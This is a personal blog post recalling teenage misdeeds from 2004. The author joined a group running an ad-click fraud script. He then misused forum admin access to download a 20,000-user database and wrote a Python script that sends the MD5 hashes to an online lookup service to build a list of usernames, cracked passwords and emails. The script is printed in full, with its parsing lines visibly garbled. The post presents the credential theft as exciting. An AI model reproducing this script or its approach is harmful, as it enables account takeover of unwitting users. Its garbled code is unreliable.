---
layout: post
title: Ensuciándome las manos en 2004
categories: [programming]
published: False
featured: False
date: 2012-09-17
category: Personal
markdown: markdown
image: /images/uploads/posts/hands-dirty/security_cameras.jpg
excerpt: En 2004, entre clases de instituto y noches de Age of Empires, me topé con una base de datos de 20.000 usuarios con contraseñas MD5.
---
If I’m curious now, I was even more with 14 or 15 years old. It was the time when I got bored of my cheap C book and started learning Python with online tutorials. I spent so much time on IRC also, mostly in programming channels (although I almost only talked in those dedicated to Age Of Empires). I met some people doing much more funny things that what I was doing. A group of friends created a script to auto-click on adsense banners. The group was private, but I was invited. All of us had a personal blog, so we used the script to click once on each adsense banner every day, so at least we got 8 or 9 clicks a day. Not much, but It helped me buying a better computer (Athlon 3400+, from a P3 866Mhz) by the end of 2004 I think.

Ah, they also got access to a private site from Motorola where we could make free mobile calls, but it only lasted a couple of weeks until they noticed. I remember calling a irc-friend to Puerto Rico and talking with his confused mother…

In one of those channels I met a guy running a big website that it’s still running. In it’s first months, the site had more than 20.000 registered users, and don’t ask me why, he thought it would be great that I helped him managing the forums, so he gave me admin privileges. I went directly to the backups panel, looking for the users database. In less than 2 minutes a ~20Mb file was being downloaded with the first real SQL code I had saw.

When I tried to open it with gedit, my computer froze. I got more luck with vim, but I hated those shell-based text editors. The file was full of entries like this (real copy-paste from original):

{% highlight sql %}
INSERT INTO phpbb_users (user_id, user_active, username, user_password,
user_session_time, user_session_page, user_lastvisit, user_regdate,
user_level, user_posts, user_timezone, user_style, user_lang,
user_dateformat, user_new_privmsg, user_unread_privmsg,
user_last_privmsg, user_login_tries, user_last_login_try, user_emailtime,
user_viewemail, user_attachsig, user_allowhtml, user_allowbbcode,
user_allowsmile, user_allowavatar, user_allow_pm, user_allow_viewonline,
user_notify, user_notify_pm, user_popup_pm, user_rank, user_avatar,
user_avatar_type, user_email, user_icq, user_website, user_from, user_sig,
user_sig_bbcode_uid, user_aim, user_yim, user_msnm, user_occ,
user_interests, user_actkey, user_newpasswd) VALUES('4', '1', '[USERNAME]',
'87f6f9d078c3bc5db5578f3b4add9470', '2147483647', '0', '2147483647',
'2147483647', '0', '0', '0.00', '1', 'english', 'D M d, Y g:i a', '0',
'0', '0', '0', '0', NULL, '0', '1', '0', '1', '1', '1', '1', '1', '0',
'1', '1', '0', '', '0', '[USER_MAIL_ADDRESS]@hotmail.com', '', '', '', '', '', '',
'', '', '', '', '', NULL);
{% endhighlight %}

Obviously I have replaced the username and mail address. There were more than 20.000 entries like that in that file. Passwords were encrypted with MD5, but I knew some online tools like gdataonline (now offline) that could help me finding out the original password. This kind of sites have a huge dictionary of words and common passwords with their corresponding hashes. You search the hash, and get the original string back.

The best thing about gdataonline is that it accepted data via GET and gave the output via XML… That was just perfect for what I had in mind. What if I made a Python script to send the password hashes to gdataonline, and store the successful passwords with their usernames and mail addresses? Since many users use the same password for everything, I would have a really dangerous material. And that was exciting.

First, I made a simple script to split the huge file in 100 parts, so each file would have 200 entries. This had two purpouses:

* The idea of reading and parsing a 20Mb file in python on my slow pc didn’t attract me
* I didn't want to send 20.000 request to gdataonline

I could have got all the (username, mail, hash) tuples with a simple SELECT in SQL, and parse the received XML with pyXML. But I didn’t even consider it, I liked it the hard way, the only way I knew. So after some hours of coding, I got this:

{% highlight python %}
#!/usr/bin/env python
 # -*- coding: iso-8859-15 -*-
 import re
 import urllib
 import os

 def getPasswords():
   successful_passwords = 0
   num = 1

   file = r"inputFile001" #Change this for every file
   text = open(file, "r")
   content = text.read()
   text.close()
   user = re.findall("VALUES.*?;", content)

   output_file = r"outputFile001" #Change this for every file
   foo = open(output_file, "w")

   spaces = " "*32
   foo.write("Nickname" + spaces + "Password" + spaces + "Mail" + "\r")
   foo.write('-' * 90 + "\r")

   for i in user:
     nickname = i.split()[2].strip(",").strip("'")
     mail = i.split()[39].strip(",").strip("'")

     f = urllib.urlopen("http://gdataonline.com/qkhash.php?mode=xml&amp;hash=%s" % i.split()[3].strip(",").strip("'"))
     xml = f.read()
     passwords = re.findall(".*?", xml)

     if passwords: # If we get the original
    password = passwords[0].split("").pop().split("")[0]
         successful_passwords +=1

    foo.write(nickname.ljust(40) + password.ljust(40) + mail.ljust(22))
    foo.write("\r")

     os.system("clear")
     print "Total: %i" % len(user)
     print "Analized: %i" % num
     print "Found: %i" % successful_passwords

     num += 1

   foo.close()
   print "%i passwords have been found" % successful_passwords

 if __name__ == '__main__':
   getPasswords()
{% endhighlight %}

Tachan! Probably not the most beautiful, organized, well documented, optimized or fast code you have seen, but you can imagine what I felt when I opened my just created file (obviously I changed data)…

|**Nickname**|**Password**|**Mail**|
|john|mylove_1234|johny_the_cool@hotmail.com|
|mike|kansas70000|the_big_boy@yahoo.com|
|admin|lalalalaImDaAdmin|admin@thissite.com|
|....|....|....|

I got  ~30% of passwords revealed, 60 passwords per file, 6000 passwords in total.

This was the time I realised how funny and useful programming could be. I didn’t have any other intention that doing something to get a real result, no more ordering lists or math problems. It felt good, I knew that what I had done wasn’t right, and probably was illegal, but it gave me the satisfaction I needed to keep learning, with more enthusiasm than ever.